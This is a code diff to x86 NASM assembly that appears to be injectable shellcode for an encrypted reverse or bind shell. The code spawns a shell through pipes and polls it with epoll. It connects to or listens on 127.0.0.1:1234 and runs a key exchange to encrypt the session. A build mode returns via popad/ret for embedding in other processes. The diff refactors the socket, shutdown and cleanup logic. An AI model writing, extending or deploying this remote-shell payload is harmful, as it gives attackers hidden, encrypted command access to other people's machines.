@@ -28,91 +28,7 @@
 ;  POSSIBILITY OF SUCH DAMAGE.
 ;  
 
-%define SYS_exit           0x001
-%define SYS_fork           0x002 
-%define SYS_read           0x003
-%define SYS_write          0x004
-%define SYS_close          0x006
-%define SYS_execve         0x00B
-%define SYS_kill           0x025
-%define SYS_pipe           0x02A
-%define SYS_dup2           0x03f
-%define SYS_socketcall     0x066
-%define SYS_epoll_ctl      0x0FF
-%define SYS_epoll_wait     0x100
-%define SYS_epoll_create1  0x149
-%define SYS_shutdown       0x175
-
-
-%define STDIN_FILENO    0
-%define STDOUT_FILENO   1
-%define STDERR_FILENO   2
-
-%define EPOLLIN     0x001
-
-%define EPOLL_CTL_ADD 1
-%define EPOLL_CTL_DEL 2
-%define EPOLL_CTL_MOD 3
-
-%define SYS_SOCKET      1   
-%define SYS_BIND        2   
-%define SYS_CONNECT     3   
-%define SYS_LISTEN      4   
-%define SYS_ACCEPT      5 
-%define SYS_GETSOCKNAME 6   
-%define SYS_GETPEERNAME 7   
-%define SYS_SOCKETPAIR  8   
-%define SYS_SEND        9   
-%define SYS_RECV       10 
-%define SYS_SENDTO     11   
-%define SYS_RECVFROM   12   
-%define SYS_SHUTDOWN   13   
-%define SYS_SETSOCKOPT 14 
-%define SYS_GETSOCKOPT 15   
-%define SYS_SENDMSG    16   
-%define SYS_RECVMSG    17     
-%define SYS_ACCEPT4    18   
-%define SYS_RECVMMSG   19 
-%define SYS_SENDMMSG   20 
-
-%define SIGCHLD 20
-%define BUFSIZ  128
-
-%define SHUT_RDWR     1
-
-struc epoll_event
-  events resd 1
-  data   resd 1
-endstruc
-
-struc crypto_ctx
-  ctr  resb  8     ; 64-bit counter + nonce
-  ekey resb 16     ; 128-bit encryption key
-  mkey resb 32     ; 256-bit mac key
-endstruc
-         
-struc sc_prop
-  p_in  resd 2     ; pipe for stdin of shell
-  p_out resd 2     ; pipe for stdout/stderr of shell
-  pid   resd 1     ; process id for shell
-  s     resd 1     ; socket handle
-  efd   resd 1     ; event handle
-  evts  resb epoll_event_size
-  buf   resb BUFSIZ
-  ctx   resb crypto_ctx_size
-endstruc
- 
-struc pushad_t
-  _edi resd 1
-  _esi resd 1
-  _ebp resd 1
-  _esp resd 1
-  _ebx resd 1
-  _edx resd 1
-  _ecx resd 1
-  _eax resd 1
-  .size:
-endstruc
+%include "include.inc"
  
     %ifndef BIN
       global main
@@ -222,6 +138,7 @@ opn_con:
       push   2                 ; family   = AF_INET
       mov    ecx, esp          ; ecx      = &args      
       int    0x80 
+      stosd                    ; save socket
       
       push   0x0100007f        ; sa.sin_addr=127.0.0.1
       push   0xD2040002        ; sa.sin_port=htons(1234)
@@ -232,8 +149,7 @@ opn_con:
       push   ecx               ; &sa
       push   eax               ; s
       mov    ecx, esp          ; &args       
-%ifndef BIND
-      stosd                    ; save socket  
+%ifndef BIND  
       push   SYS_socketcall
       pop    eax
       ; connect (s, &sa, sizeof(sa)); 
@@ -258,7 +174,8 @@ opn_con:
       mov    al, SYS_socketcall
       inc    ebx               ; ebx = SYS_ACCEPT
       int    0x80
-      stosd                    ; save socket
+      xchg   dword[ebp+s], eax ; swap with s
+      stosd                    ; save as s1
 %endif      
       ; attempt to secure the connection
       call   key_xchg
@@ -342,7 +259,9 @@ read_stdout:
       jg     poll_wait
 cls_sck:      
       ; shutdown(s, SHUT_RDWR);
-      mov    eax, SYS_shutdown
+      push   SYS_shutdown & 0xFF
+      pop    eax
+      mov    ah, 1
       mov    ebx, [ebp+s]
       push   SHUT_RDWR
       pop    ecx
@@ -372,6 +291,13 @@ cls_efd:
       cmc
       jc     cls_efd
       
+%ifdef BIND
+      ; close(s1);
+      push   SYS_close
+      pop    eax
+      mov    ebx, [ebp+s2]
+      int    0x80
+%endif      
       ; close(efd);
       push   SYS_close
       pop    eax
@@ -391,17 +317,18 @@ cls_efd:
       mov    ebx, [ebp+p_in+4]
       int    0x80   
 
-    %ifndef BIN
+%ifndef BIN
       ; exit(0);
       push   SYS_exit
       pop    eax 
       int    0x80
-    %else
-      mov    cl, sc_prop_size + (4 * 8)
+%else
+      mov    cl, sc_prop_size
+      add    cl, 4*8
       add    esp, ecx
       popad
       ret
-    %endif      
+%endif      
       
 ; ***********************************
 ;
